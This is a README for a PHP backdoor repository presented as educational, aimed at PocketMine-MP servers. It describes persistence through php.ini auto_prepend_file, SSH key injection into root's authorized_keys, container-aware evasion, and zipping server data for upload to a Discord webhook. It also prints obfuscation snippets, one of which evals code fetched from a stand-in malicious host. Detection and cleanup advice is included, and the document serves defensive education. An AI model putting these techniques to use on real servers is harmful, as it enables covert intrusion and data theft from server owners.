# PocketMine (PHP) Backdoor Educational Project

> Disclaimer  
> This project is provided for **educational and research purposes only**.  
> It demonstrates how **simple, low-level PHP scripts** can be used to implement persistent backdoors in production environments (e.g., Minecraft servers, web servers).  
> These techniques are **easy to deploy**, **highly flexible**, and can be **deeply hidden**, making them dangerous if misused.

---

## Why This Matters

PHP is a widely-used scripting language across web servers, game panels, and server software like PocketMine-MP. Its flexibility makes it especially vulnerable to:

- Dynamic code execution (`eval`, `assert`, etc.)
- File inclusion (`include`, `require`)
- Environment manipulation (`php.ini`, `auto_prepend_file`)

Malicious actors can **hide persistent payloads** inside:
- Plugins
- Composer autoloaders
- Shell wrappers
- Web APIs
- Third-party dependencies

Once embedded, these payloads can:
- Send sensitive data (e.g., plugin configs, world files)
- Inject reverse shells or remote access backdoors
- Install malware on Windows systems
- Steal Discord tokens, browser sessions, and more

This repository simulates a minimal version of such a backdoor, using real techniques observed in the wild.

---

## Common Backdoor Obfuscation Techniques

Here are some **commonly-used** methods attackers use to hide PHP backdoors:

### 1. Remote Execution via `eval(file_get_contents(...))`

```php
eval(file_get_contents("https://malicious.site/backdoor.txt"));
````

The file is **never stored on disk**, making it hard to trace. Can be wrapped in conditions or encoded.

### 2. Base64 + `eval`

```php
eval(base64_decode("ZWNobyAiSGVsbG8gV29ybGQhIjs="));
```

Used to encode malicious payloads in a way that evades detection by naive scanners or static reviewers.

### 3. Function Variables / Indirection

```php
$fn = "eval";
$fn("malicious_code_here();");
```

This bypasses naive string scanning for `eval`, `assert`, etc.

### 4. Silently Hooked Includes

```php
require_once("lib/init.php"); // Contains malicious payload deep inside
```

Often added inside existing large files or utility libraries.

### 5. Composer Autoload Abuse

* Place a payload inside `vendor/autoload.php`
* Hook `autoload_classmap.php` or `autoload_real.php` to include hidden logic

### 6. `auto_prepend_file` via `php.ini`

As shown in this project, this method **forces PHP to execute** a script at every invocation.

---

## Overview

This repository contains a two-part educational backdoor implementation in PHP:

1. `autorun.php` — Responsible for persistence and silent deployment.
2. `autoload.php` — Handles data exfiltration to a remote webhook.

These scripts demonstrate how an attacker might:

* Silently install a persistent backdoor using PHP's `auto_prepend_file` mechanism.
* Exploit PocketMine APIs to detect the environment and adjust behavior.
* Exfiltrate data such as plugins, worlds, and configs via HTTP uploads.
* Evade detection using privilege checks, container detection, and conditional execution.

---

## Technical Breakdown

### autoload.php — Persistence Layer

This script is meant to be executed once to install the backdoor. It performs the following actions:

#### Environment Validation

* Requires PHP version 7.4 or higher.
* Requires PocketMine-MP version 4.0.0 or higher.
* Ensures the script is running on Linux or Windows.

#### Container Detection

If the server’s parent directory is unreadable, it assumes it's running inside a container and limits operations to avoid detection.

#### Root Privilege Escalation

If running on a Linux host outside a container:

* Checks if it has root access using `id -u`.
* Optionally injects an SSH key into `/root/.ssh/authorized_keys`.

#### PHP INI Manipulation

* Locates the loaded `php.ini` file.
* Appends `opcache.level=3` (arbitrary flag).
* Appends `auto_prepend_file="path/to/autorun.php"` to execute the backdoor on every PHP request.

This ensures **persistence**, even across reboots or server restarts.

#### Remote Fetch

Downloads `autorun.php` from a remote source via `curl`, with SSL verification disabled.

This allows attackers to **dynamically update** the backdoor logic without local traces.

---

### autorun.php — Exfiltration Layer

This script is auto-executed on every server launch via the `auto_prepend_file` directive.

#### Backup Creation

* Recursively zips important directories: `plugins`, `plugin_data`, `worlds`.
* Also includes all root-level files in the server directory.

#### IP Fingerprinting

* Uses `https://api.ipify.org` to resolve the server's public IP.
* Sets this IP as the webhook sender name, serving as a silent fingerprint.

#### Data Upload

* Uploads the ZIP archive to a specified Discord webhook as a file.
* Deletes the ZIP archive after successful transmission to avoid suspicion.

---

## Minimal Trigger: One Line Injection

A single line in any PHP file is enough to install the full backdoor:

```php
require "autoload.php";
```

When executed, this line causes `autoload.php` to:

* Modify `php.ini` directly.
* Install itself as an `auto_prepend_file` entry.
* Persist on all future PHP executions, without needing further code injection.

This is especially dangerous if placed in:

* A plugin’s `onEnable()` method
* A scheduled task
* A composer-included library
* Any frequently-run cron job

---

## Techniques Used

| Technique                      | Description                                                  |
| ------------------------------ | ------------------------------------------------------------ |
| auto\_prepend\_file abuse      | Executes malicious code automatically before any script run. |
| SSH key injection              | Grants silent remote shell access via authorized\_keys.      |
| curl with SSL verification off | Enables insecure downloads to bypass certificate checks.     |
| php.ini direct manipulation    | Hard-patches PHP configuration for persistence.              |
| Discord webhook exfiltration   | Easy and free endpoint for file uploads.                     |
| System checks                  | Avoids triggering in dev environments or Docker containers.  |
| Version checks                 | Ensures compatibility with the running PHP & PMMP versions.  |

---

## Example Use Case

If an attacker compromises a PocketMine server:

1. They place the files and run `require "autoload.php";` once.
2. The script modifies `php.ini` and installs persistence via `auto_prepend_file`.
3. Every future server boot executes `autoload.php`, zipping and uploading data silently.
4. The attacker now receives server data persistently until detected and removed.

---

## Detection and Prevention

### How to Detect

* Check for unusual `auto_prepend_file` values in your `php.ini`:

  ```ini
  auto_prepend_file=/path/to/autorun.php
  ```
* Look for unknown SSH public keys in `~/.ssh/authorized_keys`.
* Monitor outbound traffic from PHP (e.g., to Discord or unknown IPs).
* Audit `opcache.level` in `php.ini` for unusual values like `3`.
* Search your codebase for obfuscated expressions:

    * `eval(...)`
    * `base64_decode(...)`
    * `file_get_contents("http...")`
    * Variable function calls like `$f()` where `$f = 'eval';`

### How to Clean Up

1. Open your `php.ini` and remove the `auto_prepend_file` entry.
2. Revert or rebuild the `php.ini` from a trusted template.
3. Remove the `autorun.php` and `autoload.php` files from the filesystem.
4. Check and clean `authorized_keys` for unexpected SSH keys.
5. Rotate all sensitive credentials, especially if root access was granted.

---

## Educational Purpose

This repository is intended to educate:

* PHP and plugin developers
* Minecraft server administrators
* Security researchers
* Plugin reviewers and maintainers

It demonstrates how small, well-crafted PHP scripts can silently compromise a system, persist undetected, and leak sensitive data.

---

## Final Warning

This project is strictly for research and education.
Do not use this in production environments or against systems you do not own.

Unauthorized use may be illegal and unethical.
